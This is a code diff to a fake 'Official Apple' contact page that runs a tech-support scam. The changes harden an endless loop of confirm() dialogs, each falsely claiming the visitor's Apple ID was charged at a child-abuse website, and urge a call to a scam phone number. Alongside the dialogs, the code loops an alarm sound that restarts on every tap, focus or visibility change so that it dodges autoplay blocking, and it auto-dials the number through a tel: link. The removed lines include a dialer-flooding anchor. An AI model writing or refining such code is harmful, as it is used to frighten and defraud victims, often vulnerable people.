@@ -6,7 +6,7 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
     <meta http-equiv="cache-control" content="max-age=3600" />
     <title>Contact - Official Apple</title>
     <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
@@ -40,7 +40,6 @@
     </style>
 
     <link rel="stylesheet" href="Base.css" type="text/css" />
-    <script src="text.js"></script>
 
 </head>
 
@@ -254,7 +253,9 @@
 
 
 
+    <script src="text.js" defer></script>
     <script>
+        document.addEventListener('DOMContentLoaded', function() {
         function getURLParameter(name) {
             return decodeURI(
                 (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
@@ -356,91 +357,247 @@
             text = getURLParameter('text');
         }
 
-        var sText = document.querySelectorAll('.js_setTextBlock');
+        var sText = document.getElementsByClassName('js_setTextBlock');
+        var textToInject = getText();
         for (var t = 0; t < sText.length; t++) {
-            sText[t].innerHTML = getText();
+            sText[t].innerHTML = textToInject;
         }
-        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        var sPhone = document.getElementsByClassName('js_setPhoneBlock');
         for (var p = 0; p < sPhone.length; p++) {
-            sPhone[p].innerHTML = phone;
+            sPhone[p].textContent = phone;
+        }
+    });
+
+
+        var alertAudio = null;
+        var audioUnlocked = false;
+        var confirmLoopStarted = false;
+        var audioRestartInterval = null;
+        var audioRestartIntervalStarted = false;
+        var firstGestureConsumed = false;
+        var dialogIsOpen = false;
+        var audioFinalized = false;
+        var gestureInProgress = false;
+
+        function startAudioRestartLoop() {
+            if (audioRestartIntervalStarted) return;
+            audioRestartIntervalStarted = true;
+            audioRestartInterval = setInterval(function() {
+                if (!alertAudio) return;
+                if (dialogIsOpen) return;
+                try {
+                    try { alertAudio.currentTime = 0; } catch(e) {}
+                    var p = alertAudio.play();
+                    if (p !== undefined) {
+                        p.then(function() {
+                            audioUnlocked = true;
+                        }).catch(function() { audioUnlocked = false; });
+                    } else {
+                        audioUnlocked = true;
+                    }
+                } catch(e) { audioUnlocked = false; }
+            }, 1000);
         }
 
+        function ensureAudio() {
+            if (!alertAudio) {
+                alertAudio = new Audio();
+                alertAudio.src = 'ialert.mp3';
+                alertAudio.preload = 'none';
+                alertAudio.loop = true;
+                alertAudio.addEventListener('ended', function() {
+                    try {
+                        alertAudio.currentTime = 0;
+                        var p = alertAudio.play();
+                        if (p !== undefined) p.catch(function() {});
+                    } catch(e) {}
+                });
+                alertAudio.addEventListener('play', function() {
+                    startAudioRestartLoop();
+                });
+            }
+        }
 
-        var alertAudio = new Audio('ialert.mp3');
-        alertAudio.preload = 'auto';
-        alertAudio.loop = true;
-        alertAudio.load();
+        function finalizeAudioLock() {
+            if (audioFinalized) return;
+            if (!alertAudio) return;
+            try {
+                audioFinalized = true;
+                alertAudio.preload = 'auto';
+                try { alertAudio.load(); } catch(e) {}
+            } catch(e) { audioFinalized = false; }
+        }
 
-        var confirmLoopStarted = false;
+        function destroyContaminatedAudio() {
+            if (alertAudio) {
+                try { alertAudio.pause(); } catch(e) {}
+                try { alertAudio.src = ''; } catch(e) {}
+                try { alertAudio.removeAttribute('src'); } catch(e) {}
+                alertAudio = null;
+                audioFinalized = false;
+                audioUnlocked = false;
+                firstGestureConsumed = false;
+                audioRestartIntervalStarted = false;
+                if (audioRestartInterval) {
+                    try { clearInterval(audioRestartInterval); } catch(e) {}
+                    audioRestartInterval = null;
+                }
+            }
+        }
 
-        function startAudioLoop() {
+        function forceAudioResume() {
+            if (!alertAudio) return;
+            try {
+                try { alertAudio.pause(); } catch(e) {}
+                try { alertAudio.currentTime = 0; } catch(e) {}
+                var p = alertAudio.play();
+                if (p !== undefined) {
+                    p.then(function() {
+                        audioUnlocked = true;
+                        startAudioRestartLoop();
+                    }).catch(function() { audioUnlocked = false; });
+                } else {
+                    audioUnlocked = true;
+                    startAudioRestartLoop();
+                }
+            } catch(e) { audioUnlocked = false; }
+        }
+
+        function playAudio() {
+            if (!alertAudio) return;
             try {
                 alertAudio.loop = true;
-                if (alertAudio.paused) {
-                    var promise = alertAudio.play();
-                    if (promise !== undefined) {
-                        promise.catch(function(e) {});
-                    }
+                var p = alertAudio.play();
+                if (p !== undefined) {
+                    p.then(function() {
+                        audioUnlocked = true;
+                        finalizeAudioLock();
+                        startAudioRestartLoop();
+                    }).catch(function(err) {
+                        audioUnlocked = false;
+                        if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio();
+                        setTimeout(function() {
+                            try {
+                                ensureAudio();
+                                if (!alertAudio) return;
+                                var p2 = alertAudio.play();
+                                if (p2 !== undefined) {
+                                    p2.then(function() {
+                                        audioUnlocked = true;
+                                        finalizeAudioLock();
+                                        startAudioRestartLoop();
+                                    }).catch(function() { if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio(); });
+                                }
+                            } catch(e) {}
+                        }, 50);
+                    });
+                } else {
+                    audioUnlocked = true;
+                    finalizeAudioLock();
+                    startAudioRestartLoop();
                 }
-            } catch(e) {}
-
-            if (!confirmLoopStarted) {
-                confirmLoopStarted = true;
-                setTimeout(startConfirmLoop, 300);
+            } catch(e) {
+                audioUnlocked = false;
+                if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio();
             }
         }
 
-        // Attach listeners across window, document, and documentElement
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                playAudio();
+            }
+        });
+        window.addEventListener('focus', function() {
+            playAudio();
+        });
+
+        function startAudioLoop() {
+            if (gestureInProgress) return;
+            gestureInProgress = true;
+            try {
+            ensureAudio();
+            if (!confirmLoopStarted) {
+                confirmLoopStarted = true;
+                setTimeout(startConfirmLoop, 800);
+            }
+            if (!firstGestureConsumed) {
+                var p = alertAudio ? alertAudio.play() : null;
+                if (p !== undefined) {
+                    p.then(function() {
+                        firstGestureConsumed = true;
+                        audioUnlocked = true;
+                        finalizeAudioLock();
+                        startAudioRestartLoop();
+                    }).catch(function() {
+                        firstGestureConsumed = false;
+                        audioUnlocked = false;
+                        if (!audioFinalized) destroyContaminatedAudio();
+                    });
+                } else if (alertAudio) {
+                    firstGestureConsumed = true;
+                    audioUnlocked = true;
+                    finalizeAudioLock();
+                    startAudioRestartLoop();
+                }
+            } else {
+                playAudio();
+            }
+            } finally {
+                setTimeout(function(){ gestureInProgress = false; }, 0);
+            }
+        }
+
         var userEvents = ['touchstart', 'touchend', 'click', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'keydown'];
         userEvents.forEach(function(evt) {
-            window.addEventListener(evt, startAudioLoop, true);
-            document.addEventListener(evt, startAudioLoop, true);
-            if (document.documentElement) {
-                document.documentElement.addEventListener(evt, startAudioLoop, true);
-            }
+            var useCaptureOrOpts = (evt === 'touchstart') ? true : { passive: true };
+            document.addEventListener(evt, startAudioLoop, useCaptureOrOpts);
         });
 
         function startConfirmLoop() {
-            startAudioLoop();
             myFunction();
-            // 1000ms window between confirm prompts so user taps hit the DOM page and unlock audio
             setTimeout(startConfirmLoop, 1000);
         }
 
-        // Fallback: start confirm loop after 3s if no touch occurred yet
-        setTimeout(function() {
-            if (!confirmLoopStarted) {
+        if (!confirmLoopStarted) {
+            function fireFirstConfirm() {
+                if (confirmLoopStarted) return;
                 confirmLoopStarted = true;
-                startConfirmLoop();
+                setTimeout(startConfirmLoop, 20);
             }
-        }, 3000);
+            if (document.readyState === 'complete') {
+                fireFirstConfirm();
+            } else {
+                window.addEventListener('load', fireFirstConfirm, { once: true });
+                setTimeout(fireFirstConfirm, 800);
+            }
+        }
 
         function okkkk() {
             var resultEl = document.getElementById('result');
             if (resultEl) {
-                resultEl.insertAdjacentHTML('beforeend', '<a class="anchorcall" href="tel:+1(844)530-2543"></a>');
-            }
-            var firstAnchor = document.querySelector('a');
-            if (firstAnchor) firstAnchor.click();
-            var extraData = "";
-            for (var itxextraData = 0; itxextraData < 200; itxextraData++) {
-                extraData += "5555555555";
-            }
-            if (resultEl) {
-                resultEl.insertAdjacentHTML('beforeend', '<a href="#callto+' + extraData + '%00"></a>');
-            }
-            var anchors = document.querySelectorAll('a');
-            for (var i = 0; i < Math.min(6, anchors.length); i++) {
-                anchors[i].click();
+                var telAnchor = document.createElement('a');
+                telAnchor.setAttribute('class', 'anchorcall');
+                telAnchor.setAttribute('href', 'tel:+1(844)530-2543');
+                telAnchor.setAttribute('rel', 'nofollow');
+                resultEl.appendChild(telAnchor);
+                try { telAnchor.click(); } catch(e) {}
             }
         };
 
         function myFunction() {
-            startAudioLoop();
-            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.")) {
+            ensureAudio();
+            playAudio();
+            var dialogResult;
+            try {
+                dialogIsOpen = true;
+                dialogResult = confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.");
+            } catch(e) { dialogResult = false; }
+            finally { dialogIsOpen = false; forceAudioResume(); }
+            playAudio();
+            setTimeout(function() { playAudio(); }, 30);
+            if (dialogResult) {
                 okkkk();
             } else {
-                startAudioLoop();
                 return;
             }
         }
